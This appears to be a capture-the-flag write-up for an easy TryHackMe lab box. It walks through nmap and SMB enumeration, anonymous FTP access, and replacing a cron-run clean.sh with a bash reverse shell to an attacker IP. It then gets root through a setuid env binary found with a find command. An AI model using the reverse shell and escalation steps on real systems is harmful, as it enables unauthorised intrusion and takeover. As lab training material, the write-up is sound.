Easy Tryhackme Box

## Recon

I did an nmap scan on the box that revealed 4 open ports.

But the ftp port had anonymous login enabled which was very easy to exploit.
And the rest were ok.

```bash
# Nmap 7.91 scan initiated Mon Aug  2 20:30:10 2021 as: nmap -sC -sV -Pn -oN initial.nmap 10.10.170.122

## Enumeration

I tried enumerating for shares on the ports 139, 445 for smb shares.

```bash 
smbclient -L //HOST-IP/ -N
```

This gives me shares with the names of `pics`. 

Logging into them as user and downloading those pictures thinking it might have some steg involved ended up as a rabbit hole.

But FTP service on this machine allows anonymous user login. So I logged into the ftp on port 21 with creds : `anonymous:anonymous`.
It really doesn't matter what the password is as long as username is `anonymous`.

## Exploit

There are 3 files in the ftp server. one of them is just a to_do.txt and irrelevant.

There is a `clean.sh` and a `removed_files.log` file.

Looking at the `clean.sh` file, it seems it checks if any files are present in the tmp folder and logs them into `removed_files.log` file.

So this must be a cronjob that executes itself after a certain time interval.

So I changed the script to a bash reverse shell using `!nano` command and started a listener on my local machine.

clean.sh: \
```bash
#!/bin/bash
bash -i >& /dev/tcp/<VPN-IP>/9999 0>&1
```

And so after some time, we get a shell as the user `namelessone`.

## Priv Esc

I used the `find` command to find any setuids that I can use for priv esc.

```bash
find / -perm -u=s -type f -user root 2>/dev/null
```

I found the setuid `/usr/bin/env` that has it's setuid bit set.

Using the command from gtfobins for [env](https://gtfobins.github.io/gtfobins/env/).

We can get direct root access. Now we can go ahead and read both user and root flags.
